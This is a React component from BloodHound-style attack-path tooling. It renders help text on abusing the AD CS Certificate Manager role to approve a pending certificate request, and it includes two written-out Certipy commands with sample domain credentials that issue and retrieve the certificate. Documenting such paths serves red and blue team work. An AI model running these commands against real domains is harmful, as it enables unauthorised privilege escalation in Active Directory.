// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                An attacker can identify ADCS escalation opportunities where manager approval on the certificate
                template prevents direct abuse, but leverage the Certificate Manager role to approve the pending
                certificate request.
            </Typography>
            <Typography variant='body2'>
                Certificate managers can approve pending certificate requests using Certipy:
            </Typography>
            <Typography component={'pre'}>
                {"certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd"}
            </Typography>
            <Typography variant='body2'>Download the certificate with this command:</Typography>
            <Typography component={'pre'}>
                {
                    'certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785'
                }
            </Typography>
        </>
    );
};

export default Abuse;
